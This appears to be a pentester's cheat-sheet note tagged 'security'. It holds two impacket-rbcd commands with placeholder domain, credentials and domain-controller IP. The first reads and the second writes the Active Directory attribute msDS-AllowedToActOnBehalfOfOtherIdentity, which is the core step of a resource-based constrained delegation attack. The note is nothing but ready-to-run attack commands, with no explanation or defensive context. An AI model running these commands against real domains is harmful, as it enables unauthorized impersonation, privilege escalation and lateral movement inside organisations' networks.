---
tags:
  - security
---
# Read `msDS-AllowedToActOnBehalfOfOtherIdentity`
```
impacket-rbcd catbird.local/user:'password' -delegate-to SPNCOMPUTER -delegate-from WORKSTATION -action read -dc-ip 192.168.41.13 
```
# Modify `msDS-AllowedToActOnBehalfOfOtherIdentity`
```
impacket-rbcd catbird.local/user:'password' -delegate-to SPNCOMPUTER -delegate-from WORKSTATION -action write -dc-ip 192.168.41.13 
```